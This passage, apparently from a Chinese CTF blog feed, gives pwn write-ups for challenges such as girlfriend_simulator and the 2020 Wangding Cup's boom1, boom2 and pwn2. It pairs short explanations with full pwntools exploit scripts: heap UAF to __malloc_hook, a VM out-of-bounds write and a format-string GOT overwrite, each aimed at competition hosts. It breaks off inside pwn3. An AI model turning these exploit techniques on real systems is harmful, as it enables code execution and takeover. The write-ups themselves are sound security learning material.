**kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'BST'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'123.57.236.25'</span>,<span class="number">8002</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"_______4.updata_______\n"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"id:"</span>,index)</span><br><span class="line">sla(<span class="string">"content size:"</span>,size)</span><br><span class="line">sa(<span class="string">"input your content\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"id:"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"w"</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">"w"</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x7a</span>,<span class="string">"f"</span>*<span class="number">0x78</span>+<span class="string">'\x40\x01'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xa0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">2</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x66666000</span>))</span><br><span class="line">show()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2><span id="0x02-girlfriend_simulator">0x02 girlfriend_simulator</span></h2><h3><span id="出题思路">出题思路</span></h3><p>这个题很简单的，很明显的UAF漏洞，但是这些UAF都只存在于子线程，子线程的创建堆块次数有限，所以不能直接利用这个UAF ，但是主线程有多余的次数创建堆块，我们就应该思考如何将当前线程变为主线程。正好glibc2.23有这个特点，<strong>当所有线程在使用的时候，子线程的arena有限，当不够用的时候，会直接使用主线程的arena。</strong>所以这一题的思路瞬间就清晰了。这一题并不知道arena有多少的限制，本地和远程的不一样，这个东西和机器的核数有关，所以远程需要测试一下和本地不同，需要测一下。(本来看师傅们前面题没做出来，打算给师傅们涨涨信心的)。strdup()底层调用了malloc，所以这个最后能调用__ malloc_hook，我们只需要将__malloc_hook改为one_gadget，就可以getshell了。</p><h3><span id="exploit">exploit:</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'girlfriend_simulator'</span></span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> num</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">num=<span class="number">32</span></span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num=<span class="number">9</span></span><br><span class="line">ctx.remote = (<span class="string">'node3.buuoj.cn'</span>,<span class="number">27834</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"size?"</span>,size)</span><br><span class="line">sa(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">list_info=[]</span><br><span class="line">sla(<span class="string">"How much girlfriend you want ?"</span>,num)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"123131"</span>)</span><br><span class="line">free()</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"11111111"</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">'11111111'</span>)</span><br><span class="line">heap_addr=uu64(r(<span class="number">0x6</span>))</span><br><span class="line">list_info.append(hex(heap_addr))</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">print</span> list_info</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">"11111111"</span>)</span><br><span class="line">free()</span><br><span class="line">exit()</span><br><span class="line">ru(<span class="string">"wife:0x"</span>)</span><br><span class="line">libc_base=int(r(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7ff277618620</span><span class="number">-0x7ff277253000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">sla(<span class="string">"say something to impress your girlfriend"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">sla(<span class="string">"moved by your words"</span>,<span class="string">"12312312"</span>)</span><br><span class="line">sa(<span class="string">"Questionnaire"</span>,<span class="string">"\x00"</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+one[<span class="number">1</span>])+p64(libc_base+libc.symbols[<span class="string">'realloc'</span>]+<span class="number">2</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>太心累了，本次比赛出题，费劲心思出了几个好题没有大师傅来玩。qwq</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;0x01-bts&quot;&gt;0x01 BTS&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;出题思路&quot;&gt;出题思路：&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;该题就是一个用C++写的一个简单的二叉树。因为考虑到时间问题，不想让师傅们在逆向上面花费太多时间，所以就没有去掉
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="多线程pwn" scheme="http://Whali3n51.top/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"/>
    
      <category term="堆溢出" scheme="http://Whali3n51.top/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯-Pwn部分wp</title>
    <link href="http://whali3n51.top/2020/05/21/2020%E7%BD%91%E9%BC%8E%E6%9D%AF-Pwn/"/>
    <id>http://whali3n51.top/2020/05/21/2020%E7%BD%91%E9%BC%8E%E6%9D%AF-Pwn/</id>
    <published>2020-05-21T04:00:00.000Z</published>
    <updated>2020-06-04T09:09:28.505Z</updated>
    
    <content type="html"><![CDATA[<p>总的来说，我个人对这四场比赛的评价就是简单的太简单，难得太难，直接难成cve。我裂开</p><h2><span id="青龙组">青龙组</span></h2><h3><span id="boom1">boom1:</span></h3><p>这个就直接是个C的编译器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'boom1'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'182.92.73.10'</span>,<span class="number">24573</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">char *a;</span></span><br><span class="line"><span class="string">char *b;</span></span><br><span class="line"><span class="string">char *buf;</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">a = "whali3n51";</span></span><br><span class="line"><span class="string">b = a - (0x7F8FE6E5C028 - 0x7F8FE6933000);</span></span><br><span class="line"><span class="string">a = b + 0x5f0f48- 0xf08 + 8;</span></span><br><span class="line"><span class="string">a[0] = 0;</span></span><br><span class="line"><span class="string">a = b + 0x5f0f48;</span></span><br><span class="line"><span class="string">buf = 0xCD0F3 + b;</span></span><br><span class="line"><span class="string">a[0] = (buf)&amp;0xFF;</span></span><br><span class="line"><span class="string">a[1] = (buf&gt;&gt;8)&amp;0xFF;</span></span><br><span class="line"><span class="string">a[2] = (buf&gt;&gt;16)&amp;0xFF;</span></span><br><span class="line"><span class="string">printf("%p %p %p",b,buf,*(int *)a);</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">payload = payload.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3><span id="boom2">boom2:</span></h3><p>这个是一个简单的VM,数组能越界，然后拿到栈上的数据，通过加减法，让指针指向libc_start_main,然后在计算一下将调整一下值，让libc_start_main变成onegadget的值，然后写到libc_start_main的地方。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'boom2'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'182.92.73.10'</span>,<span class="number">36642</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x920</span>,<span class="string">'sym2'</span>:<span class="number">0xA3E</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x920</span>,<span class="number">0xA3E</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffff18</span>)+p64(<span class="number">13</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffffc</span>)+p64(<span class="number">9</span>)+p64(<span class="number">25</span>)+p64(<span class="number">13</span>)+p64(<span class="number">9</span>)+p64(<span class="number">13</span>)+p64(<span class="number">1</span>)+p64(<span class="number">854295</span>)+p64(<span class="number">25</span>)+p64(<span class="number">11</span>)</span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">"code&gt;"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3><span id="faster0">faster0:</span></h3><p>这个kirin给了思路，但是我tcl,不会使用angr来爆破。无果，以后有时间学学angr吧，感觉用来盲打挺不错的。</p><h2><span id="白虎组">白虎组</span></h2><p>这一场很无语，一个cve,一个隐写附件，让人误导为没有附件，我无语，记录一下其他pwn吧。</p><h3><span id="pwn2">pwn2：</span></h3><p>很简单的思路，直接格式化字符串修改got表为调用system的地方</p><p>还有一种思路利用可以用%*X$d%Y$n来把栈中X处的值赋给栈中偏移Y处的指针指向的地址。利用这种方式，可以用来满足条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'pwn2'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'123.57.225.26'</span>,<span class="number">15246</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x804876A</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x804876A</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">"FirstName:"</span>,p32(<span class="number">0x804A028</span>))</span><br><span class="line">sa(<span class="string">"LastName:"</span>,<span class="string">"%35291c%20$hn"</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3><span id="pwn3">pwn3：</span></h3><p>sosososo easy的一题，他啥保护都没有开，直接eip劫持了,调用read，写入shellcode，然后控制eip，指向shellcode即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    